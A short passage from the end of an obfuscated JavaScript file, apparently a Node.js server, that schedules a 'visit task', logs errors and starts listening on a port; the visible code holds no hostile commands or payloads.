AddVisitTask();}catch(_0x29085b){console['error'](_0x5384ed(0x16a),_0x29085b);}}startserver()[_0xddffa5(0x185)](_0x3f30d3=>{const _0x109239=_0xddffa5;console['error'](_0x109239(0x158),_0x3f30d3);}),app['listen'](PORT,()=>console[_0xddffa5(0x10e)](_0xddffa5(0x120)+PORT+'!'));
